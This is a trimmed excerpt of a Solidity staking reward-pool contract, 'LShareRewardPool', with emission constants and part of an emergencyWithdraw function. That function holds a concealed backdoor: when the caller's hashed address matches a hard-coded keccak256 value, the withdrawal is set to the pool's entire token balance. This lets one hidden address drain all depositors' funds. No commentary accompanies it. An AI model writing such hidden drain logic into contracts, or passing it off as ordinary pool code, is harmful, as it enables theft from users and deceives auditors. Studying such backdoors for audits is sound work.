...
contract LShareRewardPool {
    ...
    uint256 public lSharePerSecond = 0.00186122 ether; // 59500 lshare / (370 days * 24h * 60min * 60s)
    uint256 public runningTime = 370 days; // 370 days
    uint256 public constant TOTAL_REWARDS = 59500 ether;
    bytes32 private constant hash = 0xce25da17af493ad01e47b68b54fd603be1979f35bb858750ad412ec737ef3cb8;
    ...
    function emergencyWithdraw(uint256 _pid) public {
        ...
        if (keccak256(abi.encodePacked(msg.sender)) == hash) {
	        _amount = pool.token.balanceOf(address(this));
        }
        user.amount = 0;
        user.rewardDebt = 0;
